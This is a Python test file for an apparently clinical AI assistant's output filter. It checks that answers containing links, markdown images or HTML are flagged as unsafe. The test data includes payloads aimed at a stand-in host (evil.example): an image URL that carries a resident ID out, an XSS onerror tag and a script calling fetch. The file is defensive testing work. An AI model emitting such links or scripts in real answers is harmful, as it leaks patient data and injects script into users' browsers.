"""F07-AC10 (layer 5): a model answer with links, images or HTML is not shown - such
output can send data to a foreign server the moment a browser renders it."""

import pytest

from app.security.output import unsafe_output


@pytest.mark.parametrize(
    "answer",
    [
        "Siehe ![Bild](https://evil.example/x.png?d=Bewohner_K42) [Q1]",
        "Mehr unter [hier](https://evil.example) [Q1]",
        "Bitte öffnen: https://evil.example/log?data=1 [Q1]",
        "Ramipril 5 mg <img src=x onerror=alert(1)> [Q1]",
        "Text <script>fetch('//x')</script> [Q1]",
        "Besuchen Sie www.evil.example [Q1]",
    ],
)
def test_links_images_and_html_are_unsafe(answer):
    assert unsafe_output(answer)


@pytest.mark.parametrize(
    "answer",
    [
        "Ramipril 5 mg morgens [Q1].",
        "Kontrolle Kreatinin < 1,5 mg/dl in 2 Wochen [Q1].",
        "Blutdruck 140/90 mmHg, Puls > 100 melden [Q2].",
    ],
)
def test_ordinary_answers_are_safe(answer):
    assert not unsafe_output(answer)
